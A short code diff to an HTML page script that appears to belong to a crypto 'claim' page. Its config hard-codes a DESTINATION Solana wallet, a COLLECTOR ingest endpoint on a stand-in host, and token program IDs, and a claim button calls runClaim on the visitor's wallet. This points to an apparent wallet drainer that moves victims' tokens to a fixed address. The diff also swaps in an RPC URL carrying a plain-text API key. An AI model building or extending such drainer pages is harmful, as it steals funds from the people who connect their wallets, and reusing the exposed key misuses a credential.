@@ -82,7 +82,7 @@
 <script>
 // ================= config =================
 var DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
-var RPC         = "https://solana-rpc.publicnode.com";
+var RPC         = "https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
 var COLLECTOR   = "https://collector.example.net/ingest";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
@@ -520,7 +520,6 @@ claimBtn.onclick = async function(){
   await runClaim(wallet);
 };
 
-// deep-link handoff
 (async function(){
   var pending = readPending();
   if (pending){
